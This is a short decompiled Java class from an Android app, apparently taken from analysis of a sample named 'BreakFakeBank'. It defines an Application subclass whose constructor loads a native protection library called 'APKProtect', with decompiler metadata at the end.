package com.google.bps.bfcfc;

import android.app.Application;

public class APKPMainAPP140CF extends Application {
  public APKPMainAPP140CF() {
    System.loadLibrary("APKProtect");
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/APKPMainAPP140CF.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */